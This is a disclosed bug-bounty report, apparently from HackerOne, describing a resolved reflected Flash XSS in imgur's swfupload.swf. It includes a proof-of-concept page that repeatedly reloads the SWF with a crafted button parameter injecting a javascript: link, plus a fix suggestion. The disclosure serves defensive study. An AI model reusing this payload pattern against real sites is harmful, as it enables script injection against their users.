---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '91421'
original_report_id: '91421'
title: Reflected Flash XSS using swfupload.swf with an epileptic reloading to bypass
  the button-event
weakness: Cross-site Scripting (XSS) - Generic
team_handle: imgur
created_at: '2015-10-01T02:12:35.523Z'
disclosed_at: '2016-07-28T10:38:10.790Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 16
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected Flash XSS using swfupload.swf with an epileptic reloading to bypass the button-event

## Metadata

- HackerOne Report ID: 91421
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: imgur
- Disclosed At: 2016-07-28T10:38:10.790Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,
This was a fun one.

So I noticed you're using swfupload.swf which is hosted on the main domain, imgur.com. This swfupload.swf as some settings you can use to modify the button on the upload. You can actually insert HTML into the Flash, but the button event (that you select yourself using another parameter) is taking over the MouseClick-event from the HTML-content you provide.

However, if you're really quick, you can actually catch the even in the HTML anyway. So by making a page that would reload the SWF constantly (from cache that is) you can make a page that looks like this:
```
<iframe src="about:blank" id="x"></iframe>

<script>u='https://imgur.com/include/flash/swfupload.swf?buttonDisabled=&buttonText=%3Ca%20%20href=%22javascript:alert(document.domain)%22%3ECLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME%3C/a%3E&buttonImageURL=/&buttonTextStyle=a{color:%23ff00ff}&buttonAction=-120&buttonCursor=-2';
setInterval(function(){document.getElementById('x').contentWindow.location=u},300)</script>
```

That will reload the content over and over, and if you click the text in the right time, the XSS will trigger.

I think I got an epileptic reaction out of testing this, but it was fun anyway, haha. You should probably move the swfupload.swf to another domain, and just embed it on imgur.com since that will give you the same options as today, but without the possibility to access the SWF directly and inject the parameters on your domain.

PoC-image attached.

Cheers,
Frans

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
